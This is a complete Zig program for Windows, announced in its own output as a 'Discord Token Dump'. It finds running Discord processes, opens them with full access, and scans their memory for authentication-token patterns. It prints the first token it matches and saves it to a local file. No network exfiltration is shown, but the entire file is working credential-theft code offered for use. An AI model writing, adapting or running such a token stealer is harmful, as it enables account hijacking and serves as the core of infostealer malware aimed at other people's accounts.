const std = @import("std");
const windows = std.os.windows;

const TH32CS_SNAPPROCESS = 0x00000002;
const MAX_PATH = 260;
const PROCESS_ALL_ACCESS = 0x001F0FFF;
const MEM_COMMIT = 0x1000;
const PAGE_READONLY = 0x02;
const PAGE_READWRITE = 0x04;
const PAGE_EX_READ = 0x20;
const PAGE_EX_READWRITE = 0x40;

pub const PROCESSENTRY32 = extern struct {
    dwSize: u32,
    cntUsage: u32,
    th32ProcessID: u32,
    th32DefaultHeapID: usize,
    th32ModuleID: u32,
    cntThreads: u32,
    th32ParentProcessID: u32,
    pcPriClassBase: i32,
    dwFlags: u32,
    szExeFile: [MAX_PATH]u8,
};

pub const MEMORY_BASIC_INFORMATION = extern struct {
    BaseAddress: usize,
    AllocationBase: usize,
    AllocationProtect: u32,
    RegionSize: usize,
    State: u32,
    Protect: u32,
    Type: u32,
};

extern "kernel32" fn CreateToolhelp32Snapshot(dwFlags: u32, th32ProcessID: u32) callconv(windows.WINAPI) windows.HANDLE;
extern "kernel32" fn Process32First(hSnapshot: windows.HANDLE, lppe: *PROCESSENTRY32) callconv(windows.WINAPI) i32;
extern "kernel32" fn Process32Next(hSnapshot: windows.HANDLE, lppe: *PROCESSENTRY32) callconv(windows.WINAPI) i32;
extern "kernel32" fn OpenProcess(dwDesiredAccess: u32, bInheritHandle: i32, dwProcessId: u32) callconv(windows.WINAPI) ?windows.HANDLE;
extern "kernel32" fn VirtualQueryEx(hProcess: windows.HANDLE, lpAddress: ?*anyopaque, lpBuffer: *MEMORY_BASIC_INFORMATION, dwLength: usize) callconv(windows.WINAPI) usize;
extern "kernel32" fn ReadProcessMemory(hProcess: windows.HANDLE, lpBaseAddress: ?*anyopaque, lpBuffer: ?*anyopaque, nSize: usize, lpNumberOfBytesRead: ?*usize) callconv(windows.WINAPI) i32;

pub fn main() !void {
    const stdout = std.io.getStdOut().writer();
    try stdout.print("Starting Discord Token Dump...\n", .{});

    const hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == windows.INVALID_HANDLE_VALUE) {
        try stdout.print("Failed to create snapshot.\n", .{});
        return;
    }
    defer _ = windows.CloseHandle(hSnapshot);

    var pe32: PROCESSENTRY32 = undefined;
    pe32.dwSize = @sizeOf(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32) == 0) {
        try stdout.print("Failed to get first process.\n", .{});
        return;
    }

    var found = false;

    while (true) {
        const exe_slice = std.mem.sliceTo(&pe32.szExeFile, 0);
        
        if (std.mem.eql(u8, exe_slice, "Discord.exe") or std.mem.eql(u8, exe_slice, "discord.exe")) {
            try stdout.print("Found Discord process detected! PID: {d}\n", .{pe32.th32ProcessID});
            
            if (try scan_mem(pe32.th32ProcessID)) {
                found = true;
                break;
            }
        }

        if (Process32Next(hSnapshot, &pe32) == 0) break;
    }

    if (!found) {
        try stdout.print("No token found or Discord not running.\n", .{});
    }
}

fn scan_mem(pid: u32) !bool {
    const hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    if (hProcess == null) return false;
    defer _ = windows.CloseHandle(hProcess.?);

    var address: usize = 0;
    var mbi: MEMORY_BASIC_INFORMATION = undefined;
    const CHUNK_SIZE = 512 * 1024;
    var buffer: [CHUNK_SIZE]u8 = undefined;

    while (VirtualQueryEx(hProcess.?, @ptrFromInt(address), &mbi, @sizeOf(MEMORY_BASIC_INFORMATION)) != 0) {
        const readable = (mbi.State == MEM_COMMIT) and
                         ((mbi.Protect & PAGE_READONLY) != 0 or
                          (mbi.Protect & PAGE_READWRITE) != 0 or
                          (mbi.Protect & PAGE_EX_READ) != 0 or
                          (mbi.Protect & PAGE_EX_READWRITE) != 0);

        if (readable) {
            var current_offset: usize = 0;
            while (current_offset < mbi.RegionSize) {
                const bytes_to_read = @min(CHUNK_SIZE, mbi.RegionSize - current_offset);
                var bytes_read: usize = 0;
                const base_ptr = mbi.BaseAddress + current_offset;

                if (ReadProcessMemory(hProcess.?, @ptrFromInt(base_ptr), &buffer, bytes_to_read, &bytes_read) != 0) {
                    if (bytes_read > 0) {
                        const data = buffer[0..bytes_read];
                        if (try check_and_save_token(data)) {
                            return true;
                        }
                    }
                }
                
                current_offset += bytes_read;
                if (bytes_read == 0) break;
            }
        }

        address += mbi.RegionSize;
        if (address == 0) break;
    }
    return false;
}

fn check_and_save_token(text: []const u8) !bool {
    const PART1_LEN = 24;
    const PART2_LEN = 6;
    const PART3_LEN = 38;
    const CORE_LEN = PART1_LEN + 1 + PART2_LEN + 1 + PART3_LEN;

    if (text.len < CORE_LEN) return false;

    var i: usize = 0;
    const end = text.len - CORE_LEN;

    while (i <= end) : (i += 1) {
        if (text[i + PART1_LEN] != '.') continue;
        if (text[i + PART1_LEN + 1 + PART2_LEN] != '.') continue;

        if (!all_token_chars(text[i .. i + PART1_LEN])) continue;
        
        const p2_start = i + PART1_LEN + 1;
        if (!all_token_chars(text[p2_start .. p2_start + PART2_LEN])) continue;

        const p3_start = p2_start + PART2_LEN + 1;
        if (!all_token_chars(text[p3_start .. p3_start + PART3_LEN])) continue;

        var start_idx = i;
        if (start_idx >= 2) {
            start_idx -= 2;
        } else {
            start_idx = 0;
        }
        
        const token = text[start_idx .. i + CORE_LEN];
        
        const stdout = std.io.getStdOut().writer();
        try stdout.print("\n[+] Token Found: {s}\n", .{token});

        try save_to_file("dump_result.txt", token);
        
        return true;
    }
    return false;
}

fn save_to_file(filename: []const u8, content: []const u8) !void {
    const file = try std.fs.cwd().createFile(filename, .{ .read = true });
    defer file.close();
    try file.writeAll(content);
    const stdout = std.io.getStdOut().writer();
    try stdout.print("[+] Saved to {s}\n", .{filename});
}

fn all_token_chars(s: []const u8) bool {
    for (s) |c| {
        if (!is_token_char(c)) return false;
    }
    return true;
}

fn is_token_char(c: u8) bool {
    return (c >= 'a' and c <= 'z') or 
           (c >= 'A' and c <= 'Z') or 
           (c >= '0' and c <= '9') or 
           c == '_' or c == '-';
}
